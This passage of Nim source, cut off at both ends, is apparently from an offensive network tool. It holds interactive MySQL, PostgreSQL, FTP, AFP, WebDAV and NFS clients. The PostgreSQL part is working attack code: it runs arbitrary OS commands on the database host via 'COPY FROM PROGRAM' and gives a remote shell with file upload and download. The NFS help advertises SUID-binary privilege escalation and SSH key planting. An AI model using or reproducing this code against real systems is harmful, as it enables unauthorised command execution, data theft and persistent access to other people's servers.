  for node in results:
    emitProtocolNode(node)

proc mysqlCliPrompt(db: string): string =
  gray("[") & bold("mysql") & gray(" ") & brightCyan(db) & gray("]> ")

proc mysqlCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc mysqlCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc mysqlCliHelp() =
  stderr.writeLine gray("[") & bold("mysql") & gray("] ") & brightCyan("commands")
  let items = [
    ("use <db>",      "switch database"),
    ("dbs",           "list databases"),
    ("tables",        "list tables in current database"),
    ("whoami",        "show current user and host"),
    ("help",          "show this help"),
    ("exit | quit",   "leave the client"),
    ("<sql>",         "execute any SQL statement"),
    ("<sql> \\",      "continue SQL on the next line"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 22) & dim(item[1])

type MysqlWinsize {.importc: "struct winsize", header: "<sys/ioctl.h>".} = object
  ws_row, ws_col, ws_xpixel, ws_ypixel: cushort
proc mysqlIoctl(fd: cint; req: culong; ws: ptr MysqlWinsize): cint {.importc: "ioctl", header: "<sys/ioctl.h>", varargs.}
const MYSQL_TIOCGWINSZ {.importc: "TIOCGWINSZ", header: "<sys/ioctl.h>".}: culong = 0

proc termWidth(): int =
  var ws: MysqlWinsize
  if mysqlIoctl(2.cint, MYSQL_TIOCGWINSZ, addr ws) == 0 and ws.ws_col > 0:
    return int(ws.ws_col)
  return 120

proc mysqlRenderVertical(columns: seq[string]; rows: seq[seq[string]]) =
  var labelW = 0
  for c in columns: labelW = max(labelW, c.len)
  for ri, row in rows:
    let hdr = gray("*") & dim(repeat('*', 27)) & gray(" Row " & $(ri+1) & " ") & dim(repeat('*', 27)) & gray("*")
    stderr.writeLine hdr
    for i, col in columns:
      let cell = if i < row.len: row[i] else: ""
      stderr.writeLine repeat(' ', max(0, labelW - col.len)) & brightCyan(col) & gray(": ") & cell

proc mysqlRenderTable(columns: seq[string]; rows: seq[seq[string]]) =
  if columns.len == 0: return
  var widths = newSeq[int](columns.len)
  for i, c in columns: widths[i] = max(widths[i], c.len)
  for row in rows:
    for i in 0 ..< min(row.len, columns.len):
      widths[i] = max(widths[i], row[i].len)
  var totalWidth = 1
  for w in widths: totalWidth += w + 3
  if totalWidth > termWidth():
    mysqlRenderVertical(columns, rows)
    return
  proc sep(): string =
    result = gray("+")
    for w in widths: result.add gray(repeat('-', w + 2) & "+")
  stderr.writeLine sep()
  var hdr = gray("|")
  for i, c in columns:
    hdr.add " " & brightCyan(c) & repeat(' ', widths[i] - c.len) & gray(" |")
  stderr.writeLine hdr
  stderr.writeLine sep()
  for row in rows:
    var line = gray("|")
    for i in 0 ..< columns.len:
      let cell = if i < row.len: row[i] else: ""
      line.add " " & cell & repeat(' ', widths[i] - cell.len) & gray(" |")
    stderr.writeLine line
  stderr.writeLine sep()

proc runMysqlCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  let sess = waitFor mysqlclient.openMysqlSession(host, config.port,
    max(config.timeoutMs, 5000), config.username, config.password)
  if sess.isNil:
    raise newException(IOError, "MySQL authentication failed")
  defer: mysqlclient.mysqlClose(sess)
  stderr.writeLine gray("[") & bold("mysql") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(config.username)
  if sess.serverVersion.len > 0:
    stderr.writeLine dim(sess.serverVersion)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands")
  initReadline()
  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(mysqlCliPrompt(sess.database))
    except EOFError:
      stderr.writeLine ""
      break
    var raw = line.strip()
    if raw.len == 0: continue
    if raw.endsWith("\\"):
      var parts: seq[string] = @[raw[0 ..< raw.len - 1].strip(leading = false)]
      while true:
        var nextLine = ""
        try:
          nextLine = lineread.readlineWithHistory(
            gray("[") & dim(".... ") & brightCyan(sess.database) & gray("]> "))
        except EOFError:
          stderr.writeLine ""
          break
        let nr = nextLine.strip(leading = false)
        if nr.endsWith("\\"):
          parts.add nr[0 ..< nr.len - 1].strip(leading = false)
        else:
          parts.add nr
          break
      raw = parts.join("\n").strip()
    if raw == "exit" or raw == "quit": break
    if raw == "help": mysqlCliHelp(); continue
    if raw == "whoami":
      stderr.writeLine dim(sess.currentUser & "  @  " & sess.host)
      continue
    if raw == "dbs" or raw == "databases" or raw.toLowerAscii() == "show databases":
      raw = "SHOW DATABASES"
    if raw == "tables" or raw.toLowerAscii() == "show tables":
      raw = "SHOW TABLES"
    if raw.toLowerAscii().startsWith("use "):
      let db = raw[4..^1].strip().strip(chars={';',' '})
      let r = waitFor mysqlclient.mysqlQuery(sess, "USE `" & db & "`")
      if r.ok:
        sess.database = db
        mysqlCliOk(db)
      else:
        mysqlCliError(r.err)
      continue
    let r = waitFor mysqlclient.mysqlQuery(sess, raw)
    if not r.ok:
      mysqlCliError(r.err)
    elif r.columns.len > 0 and r.rows.len > 0:
      mysqlRenderTable(r.columns, r.rows)
      stderr.writeLine dim($r.rows.len & " row" & (if r.rows.len == 1: "" else: "s"))
    elif r.columns.len > 0:
      stderr.writeLine dim("0 rows")
    else:
      mysqlCliOk("OK" & (if r.affected > 0: "  " & $r.affected & " rows affected" else: ""))

proc postgresRunCommand(sess: pgclient.PgSession; cmd: string): Future[tuple[output: string; ok: bool; err: string]] {.async.} =
  var r = await pgclient.postgresQuery(sess, "CREATE TEMP TABLE _nimux_cmd(line text)")
  if not r.ok: return ("", false, r.err)
  r = await pgclient.postgresQuery(sess, "COPY _nimux_cmd FROM PROGRAM $_ne_$" & cmd & " 2>&1$_ne_$")
  if not r.ok:
    discard await pgclient.postgresQuery(sess, "DROP TABLE IF EXISTS _nimux_cmd")
    return ("", false, r.err)
  r = await pgclient.postgresQuery(sess, "SELECT string_agg(line, chr(10)) FROM _nimux_cmd")
  discard await pgclient.postgresQuery(sess, "DROP TABLE IF EXISTS _nimux_cmd")
  if not r.ok: return ("", false, r.err)
  let output = if r.rows.len > 0 and r.rows[0].len > 0: r.rows[0][0] else: ""
  return (output, true, "")

proc postgresCliPrompt(database: string): string =
  gray("[") & bold("postgres") & gray(" ") & brightCyan(database) & gray("]> ")

proc postgresCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("postgres") & gray("] ") & dim(text)

proc postgresCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc postgresCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc postgresCliHelp() =
  stderr.writeLine gray("[") & bold("postgres") & gray("] ") & brightCyan("commands")
  let items = [
    ("help", "show this help"),
    ("exit | quit", "leave the client"),
    ("whoami", "show current user and database"),
    ("databases", "list databases"),
    ("tables", "list tables in current schema search path"),
    ("use <db>", "reconnect to another database"),
    ("shell <cmd>  |  !<cmd>", "run OS command via COPY FROM PROGRAM"),
    ("<sql> \\", "continue SQL on the next line"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 26) & dim(item[1])

proc postgresRenderTable(columns: seq[string]; rows: seq[seq[string]]) =
  if columns.len == 0:
    return
  var widths = newSeq[int](columns.len)
  for i, col in columns:
    widths[i] = col.len
  for row in rows:
    for i in 0 ..< min(row.len, widths.len):
      widths[i] = max(widths[i], row[i].len)
  proc sep(): string =
    var line = ""
    for i, width in widths:
      if i > 0: line.add gray("-+-")
      line.add gray(repeat("-", width))
    line
  var header = ""
  for i, col in columns:
    if i > 0: header.add gray(" | ")
    header.add padAnsiRight(brightCyan(col), widths[i])
  stderr.writeLine header
  stderr.writeLine sep()
  for row in rows:
    var line = ""
    for i in 0 ..< widths.len:
      if i > 0: line.add gray(" | ")
      let cell = if i < row.len: row[i] else: ""
      line.add cell & repeat(' ', widths[i] - cell.len)
    stderr.writeLine line
  stderr.writeLine dim("(" & $rows.len & " row" & (if rows.len == 1: "" else: "s") & ")")

proc runPostgresCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  let sess = waitFor pgclient.openPostgresSession(host, config.port,
    max(config.timeoutMs, 5000), config.username, config.password,
    config.mssqlDatabase, config.useSsl)
  if sess.isNil:
    raise newException(IOError, "PostgreSQL authentication failed")
  defer: pgclient.postgresClose(sess)
  stderr.writeLine gray("[") & bold("postgres") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(config.username)
  if sess.serverVersion.len > 0:
    stderr.writeLine dim(sess.serverVersion)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands")
  initReadline()
  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(postgresCliPrompt(sess.database))
    except EOFError:
      stderr.writeLine ""
      break
    var raw = line.strip()
    if raw.len == 0: continue
    if raw.endsWith("\\"):
      var parts: seq[string] = @[raw[0 ..< raw.len - 1].strip(leading = false)]
      while true:
        var nextLine = ""
        try:
          nextLine = lineread.readlineWithHistory(
            gray("[") & dim(".... ") & brightCyan(sess.database) & gray("]> "))
        except EOFError:
          stderr.writeLine ""
          break
        let nr = nextLine.strip(leading = false)
        if nr.endsWith("\\"):
          parts.add nr[0 ..< nr.len - 1].strip(leading = false)
        else:
          parts.add nr
          break
      raw = parts.join("\n").strip()
    if raw in ["exit", "quit"]: break
    if raw == "help":
      postgresCliHelp()
      continue
    if raw == "whoami":
      postgresCliNotice(sess.currentUser & "  @  " & sess.database)
      continue
    if raw == "databases":
      let r = waitFor pgclient.postgresQuery(sess,
        "SELECT datname FROM pg_database WHERE datistemplate = false ORDER BY 1")
      if not r.ok: postgresCliError(r.err)
      elif r.columns.len > 0: postgresRenderTable(r.columns, r.rows)
      continue
    if raw == "tables":
      let r = waitFor pgclient.postgresQuery(sess,
        "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') ORDER BY 1,2")
      if not r.ok: postgresCliError(r.err)
      elif r.columns.len > 0: postgresRenderTable(r.columns, r.rows)
      continue
    if raw.toLowerAscii().startsWith("use "):
      let db = raw[4 .. ^1].strip().strip(chars = {';',' '})
      let newSess = waitFor pgclient.openPostgresSession(host, config.port,
        max(config.timeoutMs, 5000), config.username, config.password, db, config.useSsl)
      if newSess.isNil:
        postgresCliError("database switch failed")
      else:
        pgclient.postgresClose(sess)
        sess.sock = newSess.sock
        sess.database = newSess.database
        sess.currentUser = newSess.currentUser
        sess.serverVersion = newSess.serverVersion
        sess.parameterStatus = newSess.parameterStatus
        postgresCliOk(db)
      continue
    block shellCmd:
      var shellArg = ""
      if raw.startsWith("!"):
        shellArg = raw[1 .. ^1].strip()
      elif raw.toLowerAscii().startsWith("shell "):
        shellArg = raw[6 .. ^1].strip()
      else:
        break shellCmd
      if shellArg.len == 0: continue
      let (output, ok, err) = waitFor postgresRunCommand(sess, shellArg)
      if not ok:
        postgresCliError(err)
      else:
        if output.len > 0: stderr.writeLine output
      continue
    let r = waitFor pgclient.postgresQuery(sess, raw)
    if not r.ok:
      postgresCliError(r.err)
    elif r.columns.len > 0:
      postgresRenderTable(r.columns, r.rows)
    else:
      postgresCliOk(if r.commandTag.len > 0: r.commandTag else: "OK")

proc pgShellQuote(s: string): string =
  "'" & s.replace("'", "'\\''") & "'"

proc pgShellResolvePath(cwd, arg: string): string =
  if arg.startsWith("/") or arg.startsWith("~"):
    arg
  else:
    let base = cwd.strip(leading = false, trailing = true, chars = {'/'})
    base & "/" & arg

proc runPostgresShell(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--shell requires exactly one target")
  let host = targets[0]
  let sess = waitFor pgclient.openPostgresSession(host, config.port,
    max(config.timeoutMs, 5000), config.username, config.password,
    config.mssqlDatabase, config.useSsl)
  if sess.isNil:
    raise newException(IOError, "PostgreSQL authentication failed")
  defer: pgclient.postgresClose(sess)
  stderr.writeLine gray("[") & bold("postgres") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(config.username)
  stderr.writeLine dim("type 'exit' to quit, ctrl-c to exit")
  var cwd = ""
  block initCwd:
    let (output, ok, _) = waitFor postgresRunCommand(sess, "pwd")
    if ok: cwd = output.strip()

  proc pgRunInCwd(cmd: string): tuple[output: string; ok: bool; err: string] =
    let full = if cwd.len > 0: "cd " & pgShellQuote(cwd) & " && " & cmd else: cmd
    waitFor postgresRunCommand(sess, full)

  proc pgShellHelp() =
    stderr.writeLine gray("[") & bold("postgres") & gray("] ") & brightCyan("shell commands")
    let items = [
      ("help", "show this help"),
      ("exit | quit", "leave the shell"),
      ("cd <path>", "change directory"),
      ("upload <local> [remote]", "upload a local file to the remote host"),
      ("download <remote> [local]", "download a remote file to local"),
      ("<command>", "run OS command via COPY FROM PROGRAM"),
    ]
    for item in items:
      stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 26) & dim(item[1])

  proc pgDownload(remotePath, localSpec: string) =
    let absRemote = pgShellResolvePath(cwd, remotePath)
    let localDest =
      if localSpec.len > 0: localSpec
      else: extractFilename(absRemote)
    let safeRemote = absRemote.replace("'", "''")
    let qr = waitFor pgclient.postgresQuery(sess,
      "SELECT encode(pg_read_binary_file('" & safeRemote & "'), 'base64')")
    if not qr.ok:
      stderr.writeLine red("[!] ") & qr.err
      return
    if qr.rows.len == 0 or qr.rows[0].len == 0:
      stderr.writeLine red("[!] ") & "empty result"
      return
    let b64 = qr.rows[0][0].replace("\n", "").replace("\r", "")
    let data = base64.decode(b64)
    writeFile(localDest, data)
    stderr.writeLine green("[+] ") & "downloaded " & $data.len & " bytes → " & localDest

  proc pgUpload(localPath, remoteSpec: string) =
    if not fileExists(localPath):
      stderr.writeLine red("[!] ") & "local file not found: " & localPath
      return
    let absRemote = pgShellResolvePath(cwd,
      if remoteSpec.len > 0: remoteSpec else: extractFilename(localPath))
    let data = readFile(localPath)
    let b64 = base64.encode(data)
    let sql = "COPY (SELECT $_ne_$" & b64 & "$_ne_$) TO PROGRAM $_ne_$base64 -d > " & absRemote & "$_ne_$"
    let qr = waitFor pgclient.postgresQuery(sess, sql)
    if not qr.ok:
      stderr.writeLine red("[!] ") & qr.err
      return
    stderr.writeLine green("[+] ") & "uploaded " & $data.len & " bytes → " & absRemote

  initReadline()
  while true:
    let cwdDisplay = if cwd.len > 0: cwd else: "?"
    let prompt = gray("[") & bold("postgres") & gray("@") & brightCyan(host) &
      gray(" ") & cwdDisplay & gray("]$ ")
    var line = ""
    try:
      line = lineread.readlineWithHistory(prompt)
    except EOFError:
      stderr.writeLine ""
      break
    let raw = line.strip()
    if raw.len == 0: continue
    if raw in ["exit", "quit"]: break
    if raw.toLowerAscii() in ["help", "/help", "?"]:
      pgShellHelp()
      continue
    if raw == "cd" or raw.toLowerAscii().startsWith("cd "):
      let arg = if raw.len > 2: raw[3 .. ^1].strip() else: ""
      let cdCmd =
        if arg.len == 0 or arg == "~":
          "cd && pwd"
        elif arg.startsWith("~/"):
          "cd " & arg & " && pwd"
        else:
          let target = pgShellResolvePath(cwd, arg)
          "cd " & pgShellQuote(target) & " && pwd"
      let (output, ok, err) = waitFor postgresRunCommand(sess, cdCmd)
      if not ok:
        stderr.writeLine red("[!] ") & err
      else:
        cwd = output.strip()
      continue
    let parts = raw.splitWhitespace(maxsplit = 2)
    if parts.len >= 2 and parts[0].toLowerAscii() == "upload":
      let localPath = parts[1]
      let remoteSpec = if parts.len >= 3: parts[2] else: ""
      pgUpload(localPath, remoteSpec)
      continue
    if parts.len >= 2 and parts[0].toLowerAscii() == "download":
      let remotePath = parts[1]
      let localSpec = if parts.len >= 3: parts[2] else: ""
      pgDownload(remotePath, localSpec)
      continue
    let (output, ok, err) = pgRunInCwd(raw)
    if not ok:
      stderr.writeLine red("[!] ") & err
    else:
      if output.len > 0:
        stdout.write output
        if not output.endsWith("\n"): stdout.write "\n"
        flushFile(stdout)

proc ftpCliPrompt(cwd: string): string =
  gray("[") & bold("ftp") & gray(" ") & brightCyan(cwd) & gray("]> ")

proc ftpCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("ftp") & gray("] ") & dim(text)

proc ftpCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc ftpCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc ftpCliHelp() =
  stderr.writeLine gray("[") & bold("ftp") & gray("] ") & brightCyan("commands")
  let items = [
    ("ls [path]",    "list directory"),
    ("cd <path>",    "change directory"),
    ("pwd",          "print working directory"),
    ("whoami",       "show current user and host"),
    ("get <file>",   "download file to current local directory"),
    ("put <file>",   "upload local file to current remote directory"),
    ("mkdir <dir>",  "create directory"),
    ("rm <path>",    "remove file or directory"),
    ("exit | quit",  "leave the client"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 22) & dim(item[1])

proc runFtpCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  let host = targets[0]
  let user = if config.username.len > 0: config.username else: "anonymous"
  let pass = if config.password.len > 0: config.password else: "anonymous@"
  let sess = waitFor ftpclient.openFtpSession(host, config.port, max(config.timeoutMs, 5000), user, pass)
  if sess.isNil:
    raise newException(IOError, "FTP authentication failed")
  defer:
    try: discard waitFor ftpclient.ftpCmd(sess, "QUIT") except: discard
    try: sess.sock.close() except: discard
  stderr.writeLine gray("[") & bold("ftp") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(user)
  if sess.banner.len > 0:
    stderr.writeLine dim(sess.banner)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands")
  initReadline()
  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(ftpCliPrompt(sess.cwd))
    except EOFError:
      stderr.writeLine ""
      break
    let raw = line.strip()
    if raw.len == 0: continue
    if raw == "exit" or raw == "quit" or raw == "bye": break
    if raw == "help":
      ftpCliHelp()
      continue
    if raw == "whoami":
      stderr.writeLine dim(sess.username & "@" & sess.host)
      continue
    if raw == "pwd":
      let p = waitFor ftpclient.ftpPwd(sess)
      stderr.writeLine dim(p)
      continue
    if raw.startsWith("cd "):
      let path = raw[3..^1].strip()
      let (ok, msg) = waitFor ftpclient.ftpCd(sess, path)
      if not ok: ftpCliError(path & ": " & msg)
      continue
    if raw == "ls" or raw.startsWith("ls "):
      let path = if raw.len > 3: raw[3..^1].strip() else: ""
      let entries = waitFor ftpclient.ftpList(sess, path)
      if entries.len == 0:
        ftpCliNotice("empty")
      else:
        for e in entries: stderr.writeLine dim(e)
      continue
    if raw.startsWith("get "):
      let name = raw[4..^1].strip()
      let localDest = getCurrentDir() / extractFilename(name)
      let (ok, nbytes, msg) = waitFor ftpclient.ftpGet(sess, name, localDest)
      if ok:
        ftpCliOk(bold(extractFilename(name)) & "  " & dim($nbytes & " bytes") & "  " & dim("→ " & localDest))
      else:
        ftpCliError(msg)
      continue
    if raw.startsWith("put "):
      let localPath = raw[4..^1].strip()
      let remoteName = extractFilename(localPath)
      let (ok, nbytes, msg) = waitFor ftpclient.ftpPut(sess, localPath, remoteName)
      if ok:
        ftpCliOk(bold(remoteName) & "  " & dim($nbytes & " bytes") & "  " & dim("→ " & sess.cwd & "/" & remoteName))
      else:
        ftpCliError(msg)
      continue
    if raw.startsWith("mkdir "):
      let path = raw[6..^1].strip()
      let (ok, msg) = waitFor ftpclient.ftpMkdir(sess, path)
      if ok: ftpCliOk(path) else: ftpCliError(msg)
      continue
    if raw.startsWith("rm "):
      let path = raw[3..^1].strip()
      let (ok, msg) = waitFor ftpclient.ftpRm(sess, path)
      if ok: ftpCliOk("removed " & path) else: ftpCliError(msg)
      continue
    ftpCliError("unknown command: " & raw.split(' ')[0])

proc normalizePosixCliPath(cwd, input: string): string =
  var parts: seq[string] = @[]
  if input.startsWith("/"):
    discard
  else:
    for piece in cwd.split('/'):
      let p = piece.strip()
      if p.len > 0:
        parts.add p
  for piece in input.split('/'):
    let p = piece.strip()
    if p.len == 0 or p == ".":
      continue
    if p == "..":
      if parts.len > 0:
        parts.setLen(parts.len - 1)
    else:
      parts.add p
  if parts.len == 0: "/"
  else: "/" & parts.join("/")

proc afpCliPrompt(volumeName, cwd: string): string =
  let shown =
    if volumeName.len == 0: "/"
    elif cwd == "/": "/" & volumeName
    else: "/" & volumeName & cwd
  gray("[") & bold("afp") & gray(" ") & brightCyan(shown) & gray("]> ")

proc afpCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("afp") & gray("] ") & dim(text)

proc afpCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc afpCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc afpCliHelp() =
  stderr.writeLine gray("[") & bold("afp") & gray("] ") & brightCyan("commands")
  let items = [
    ("shares", "list AFP shares"),
    ("use <share>", "select a volume"),
    ("ls [path]", "list directory"),
    ("cd <path>", "change directory"),
    ("pwd", "print current AFP path"),
    ("whoami", "show current user and host"),
    ("get <file>", "download file to current local directory"),
    ("put <file>", "upload local file to current AFP directory"),
    ("mkdir <dir>", "create directory"),
    ("exit | quit", "leave the client"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 22) & dim(item[1])

proc afpResolveDid(sess: afpclient.AfpSession; volumeId: uint16; path: string): tuple[ok: bool; did: uint32; message: string] =
  if path == "/" or path.len == 0:
    return (true, 2'u32, "")
  var did = 2'u32
  for piece in path.split('/'):
    let part = piece.strip()
    if part.len == 0:
      continue
    let lookup = waitFor afpclient.afpLookupEntry(sess, volumeId, did, part)
    if not lookup.ok:
      return (false, did, lookup.message)
    if not lookup.entry.isDirectory:
      return (false, did, part & ": not a directory")
    did = lookup.entry.nodeId
  (true, did, "")

proc runAfpCli(config: CliConfig) =
  let targets = parseTargets(config.targets)
  if targets.len == 0: raise newException(ValueError, "no targets supplied")
  if targets.len > 1: raise newException(ValueError, "--cli requires exactly one target")
  if config.username.len == 0 or config.password.len == 0:
    raise newException(ValueError, "AFP --cli requires -u and -p")
  let host = targets[0]
  let sess = waitFor afpclient.openAfpSession(host, config.port, max(config.timeoutMs, 5000),
    config.username, config.password)
  if sess.isNil:
    raise newException(IOError, "AFP authentication failed")
  defer: afpclient.closeAfpSession(sess)
  var shares = waitFor afpclient.afpListShares(sess)
  var volumeName = ""
  var volumeId = 0'u16
  var cwd = "/"
  var createdDirs = initTable[string, seq[string]]()
  stderr.writeLine gray("[") & bold("afp") & gray("] ") &
    brightCyan(host & ":" & $config.port) & "  " & dim(config.username)
  stderr.writeLine dim("type 'exit' to quit; 'help' for commands")
  initReadline()
  while true:
    var line = ""
    try:
      line = lineread.readlineWithHistory(afpCliPrompt(volumeName, cwd))
    except EOFError:
      stderr.writeLine ""
      break
    let raw = line.strip()
    if raw.len == 0: continue
    if raw in ["exit", "quit", "bye"]: break
    if raw == "help":
      afpCliHelp()
      continue
    if raw == "whoami":
      afpCliNotice(config.username & "@" & host)
      continue
    if raw == "pwd":
      afpCliNotice(if volumeName.len == 0: "/" else: "/" & volumeName & (if cwd == "/": "" else: cwd))
      continue
    if raw == "shares":
      shares = waitFor afpclient.afpListShares(sess)
      if shares.len == 0:
        afpCliNotice("empty")
      else:
        for s in shares:
          stderr.writeLine dim(s)
      continue
    if raw.startsWith("use "):
      let share = raw[4..^1].strip()
      if share.len == 0:
        afpCliError("use requires a share name")
        continue
      let opened = waitFor afpclient.afpOpenVolume(sess, share)
      if opened == 0'u16:
        afpCliError("could not open volume " & share)
        continue
      if volumeId != 0'u16:
        discard waitFor afpclient.afpCloseVolume(sess, volumeId)
      volumeId = opened
      volumeName = share
      cwd = "/"
      afpCliOk("using " & share)
      continue
    if volumeId == 0'u16:
      afpCliError("select a share first with 'use <share>'")
      continue
    if raw == "ls" or raw.startsWith("ls "):
      let target = if raw.len > 3: normalizePosixCliPath(cwd, raw[3..^1].strip()) else: cwd
      let resolved = afpResolveDid(sess, volumeId, target)
      if not resolved.ok:
        afpCliError(resolved.message)
        continue
      let entries = waitFor afpclient.afpListDirectory(sess, volumeId, resolved.did)
      var merged = entries
      let dirNames = waitFor afpclient.afpGetDirEntryNames(sess, volumeId, resolved.did)
      for name in dirNames:
        if merged.anyIt(it.name == name):
          continue
        let checked = waitFor afpclient.afpLookupEntry(sess, volumeId, resolved.did, name)
        if checked.ok:
          merged.add checked.entry
      for name in createdDirs.getOrDefault(target, @[]):
        if merged.anyIt(it.name == name):
          continue
        let checked = waitFor afpclient.afpLookupEntry(sess, volumeId, resolved.did, name)
        if checked.ok:
          merged.add checked.entry
        else:
          merged.add afpclient.AfpEntry(name: name, isDirectory: true)
      if merged.len == 0:
        afpCliNotice("empty")
      else:
        for e in merged:
          let checked = waitFor afpclient.afpLookupEntry(sess, volumeId, resolved.did, e.name)
          let isDir = checked.ok and checked.entry.isDirectory
          let shownSize =
            if isDir: dim("     -")
            else:
              let s = if checked.ok: checked.entry.size else: e.size
              dim(align($s, 8))
          let mark = if isDir: cyan("d") else: dim("-")
          stderr.writeLine mark & "  " & shownSize & "  " & e.name
      continue
    if raw.startsWith("cd "):
      let target = normalizePosixCliPath(cwd, raw[3..^1].strip())
      let resolved = afpResolveDid(sess, volumeId, target)
      if not resolved.ok:
        afpCliError(resolved.message)
      else:
        cwd = target
      continue
    if raw.startsWith("mkdir "):
      let spec = raw[6..^1].strip()
      let full = normalizePosixCliPath(cwd, spec)
      let parent = full.rsplit('/', 1)
      let parentPath = if parent.len == 2 and parent[0].len > 0: parent[0] else: "/"
      let name = if parent.len == 2: parent[1] else: full.strip(chars={'/'})
      let resolved = afpResolveDid(sess, volumeId, if parentPath.len == 0: "/" else: parentPath)
      if not resolved.ok:
        afpCliError(resolved.message)
        continue
      let (ok, msg) = waitFor afpclient.afpCreateDir(sess, volumeId, resolved.did, name)
      if ok:
        afpCliOk(name)
        if not createdDirs.hasKey(if parentPath.len == 0: "/" else: parentPath):
          createdDirs[if parentPath.len == 0: "/" else: parentPath] = @[]
        if name notin createdDirs[if parentPath.len == 0: "/" else: parentPath]:
          createdDirs[if parentPath.len == 0: "/" else: parentPath].add name
      else:
        afpCliError(msg)
      continue
    if raw.startsWith("get "):
      let spec = raw[4..^1].strip()
      let full = normalizePosixCliPath(cwd, spec)
      let parent = full.rsplit('/', 1)
      let parentPath = if parent.len == 2 and parent[0].len > 0: parent[0] else: "/"
      let name = if parent.len == 2: parent[1] else: full.strip(chars={'/'})
      let resolved = afpResolveDid(sess, volumeId, parentPath)
      if not resolved.ok:
        afpCliError(resolved.message)
        continue
      let localDest = getCurrentDir() / extractFilename(name)
      let (ok, nbytes, msg) = waitFor afpclient.afpReadFile(sess, volumeId, resolved.did, name, localDest)
      if ok:
        afpCliOk(bold(name) & "  " & dim($nbytes & " bytes") & "  " & dim("→ " & localDest))
      else:
        afpCliError(msg)
      continue
    if raw.startsWith("put "):
      let localPath = raw[4..^1].strip()
      let remoteName = extractFilename(localPath)
      let resolved = afpResolveDid(sess, volumeId, cwd)
      if not resolved.ok:
        afpCliError(resolved.message)
        continue
      let (ok, nbytes, msg) = waitFor afpclient.afpWriteFile(sess, volumeId, resolved.did, localPath, remoteName)
      if ok:
        afpCliOk(bold(remoteName) & "  " & dim($nbytes & " bytes"))
      else:
        afpCliError(msg)
      continue
    afpCliError("unknown command: " & raw.split(' ')[0])

proc webDavCliPrompt(cwd: string): string =
  gray("[") & bold("webdav") & gray(" ") & brightCyan(cwd) & gray("]> ")

proc webDavCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("webdav") & gray("] ") & dim(text)

proc webDavCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc webDavCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc webDavCliHelp() =
  stderr.writeLine gray("[") & bold("webdav") & gray("] ") & brightCyan("commands")
  let items = [
    ("ls [path]", "list directory"),
    ("cd <path>", "change directory"),
    ("pwd", "print current path"),
    ("whoami", "show current user and host"),
    ("get <file>", "download file to current local directory"),
    ("put <file>", "upload local file to current remote directory"),
    ("mkdir <dir>", "create directory"),
    ("rm <path>", "remove file or directory"),
    ("exit | quit", "leave the client"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 22) & dim(item[1])

proc nfsCliPrompt(exportPath, cwd: string): string =
  let shown = if cwd == "/": exportPath else: exportPath & cwd
  gray("[") & bold("nfs") & gray(" ") & brightCyan(shown) & gray("]> ")

proc nfsCliNotice(text: string) =
  stderr.writeLine gray("[") & bold("nfs") & gray("] ") & dim(text)

proc nfsCliOk(text: string) =
  stderr.writeLine green("[+] ") & text

proc nfsCliError(text: string) =
  stderr.writeLine red("[!] ") & text

proc nfsCliHelp() =
  stderr.writeLine gray("[") & bold("nfs") & gray("] ") & brightCyan("commands")
  let items = [
    ("exports",                "list available NFS exports"),
    ("use <export>",           "mount and switch to an export"),
    ("ls [path]",              "list directory"),
    ("cd <path>",              "change directory"),
    ("pwd",                    "print current path"),
    ("stat <path>",            "show file attributes"),
    ("cat <file>",             "print file contents"),
    ("get <file> [local]",     "download file to current local directory"),
    ("put <file> [remote]",    "upload local file to current remote path"),
    ("chmod <mode> <path>",    "change file permissions (octal, e.g. 755)"),
    ("suid <bin> [name]",      "upload binary with SUID bit set (no_root_squash privesc)"),
    ("sshkey <pub> [path]",    "write SSH public key to authorized_keys"),
    ("exit | quit",            "leave the client"),
  ]
  for item in items:
    stderr.writeLine "  " & padAnsiRight(brightCyan(item[0]), 26) & dim(item[1])

proc nfsModeStr(mode: uint32): string =
  let bits = [
    (0o400'u32, "r"), (0o200'u32, "w"), (0o100'u32, "x"),
